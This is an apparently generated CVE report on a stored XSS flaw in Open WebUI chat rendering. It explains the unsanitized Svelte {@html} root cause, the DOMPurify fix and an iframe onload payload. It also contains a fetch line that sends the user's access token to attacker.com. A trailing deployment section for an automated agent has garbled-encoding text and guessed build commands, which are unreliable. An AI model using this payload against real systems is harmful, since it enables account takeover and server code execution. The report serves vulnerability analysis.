"# CVE Report: CVE-2025-46719\n\n## Summary\nCVE-2025-46719 is a high-severity vulnerability affecting the Open WebUI platform prior to version 0.6.6. The vulnerability is classified as CWE-79: Improper Neutralization of Input During Web Page Generation, commonly known as Cross-site Scripting (XSS). Specifically, the issue arises from the way certain HTML tags in chat messages are rendered, allowing attackers to inject malicious JavaScript code into chat transcripts. This code executes in the user's browser whenever the chat transcript is opened, enabling attackers to retrieve the user's access token and potentially gain full control over their account. The vulnerability also poses a risk of Remote Code Execution (RCE) on the server if exploited against an admin user.\n\n## Root Cause\nThe root cause of the vulnerability lies in the improper handling of HTML content within chat messages. The code responsible for rendering chat messages does not adequately sanitize user input, allowing for the injection of arbitrary HTML and JavaScript. The specific code snippet that introduces the vulnerability is found in the `MarkdownTokens.svelte` file:\n\n```svelte\n{:else if token.text.includes(`<iframe src=\"${WEBUI_BASE_URL}/api/v1/files/`)}\n   {@html `${token.text}`}\n```\n\nThis line uses the Svelte `{@html}` directive, which renders the content as HTML without escaping it. As a result, if an attacker sends a chat message containing an iframe with a malicious payload, the browser will execute the JavaScript code embedded within that iframe.\n\nThe patch introduced in version 0.6.6 addresses this issue by sanitizing the HTML content using the DOMPurify library, which effectively neutralizes any potentially harmful scripts before rendering.\n\n## Exploitation Details\nTo exploit this vulnerability, an attacker can send a chat message containing a crafted payload that includes an iframe with JavaScript code. For example, the following payload can be used:\n\n```html\n<iframe src=\"http://localhost:8080/api/v1/files/\" onload=\"alert(1)\"></iframe>\n```\n\nWhen a user opens the chat transcript containing this message, the JavaScript code will execute, triggering an alert. In a more malicious scenario, the attacker could replace the alert with code to steal the user's access token:\n\n```javascript\nfetch(\"https://attacker.com/?token=\" + localStorage.getItem(\"token\"))\n```\n\nOnce the attacker has the access token, they can take control of the user's account. If the attacker targets an admin user, they can leverage the stolen token to execute arbitrary Python code on the server through the admin functions interface.\n\n## Environment Setup Requirements\n- **Port**: 8080\n- **Target Endpoint**: `/api/v1/files/`\n- **Explicit Configuration**: None explicitly mentioned in the advisory.\n\n## Complete PoC Code\nThe proof-of-concept code provided in the advisory for exploiting the vulnerability is as follows:\n\n```html\n<iframe src=\"http://localhost:8080/api/v1/files/\" onload=\"alert(1)\"></iframe>\n```\n\nThis payload can be modified to include more harmful JavaScript code, such as the fetch request to steal the access token. \n\nIn summary, CVE-2025-46719 represents a significant security risk for users of the Open WebUI platform, particularly in environments where chat transcripts can be shared among users. The vulnerability has been addressed in version 0.6.6, and users are strongly advised to upgrade to this version or later to mitigate the risk.\n\n## üöÄ DEPLOYMENT STRATEGY (USE THIS - DO NOT GUESS!)\n\n**Repository URL**: https://github.com/open-webui/open-webui\n**Platform**: N/A\n**Language**: python\n**Build Tool**: pip\n\n### Build Commands:\n```bash\ngit clone https://github.com/open-webui/open-webui\ncd $(basename https://github.com/open-webui/open-webui)\npip install -r requirements.txt || pip install -e .\n```\n\n### Start Commands:\n```bash\npython app.py  # Êàñ flask run / python manage.py runserver\n```\n\n### Deployment Notes:\n‰ªé GitHub Ê∫êÁ†ÅÈÉ®ÁΩ≤„ÄÇËØ≠Ë®Ä: python, ÊûÑÂª∫Â∑•ÂÖ∑: pip\n\n‚ö†Ô∏è **CRITICAL INSTRUCTIONS**:\n1. DO NOT try to find Docker images or guess repository URLs\n2. USE THE REPOSITORY URL PROVIDED ABOVE\n3. Clone from the specified repository and follow build/start commands\n4. If build commands fail, analyze error and adapt (but keep using the same repo)\n"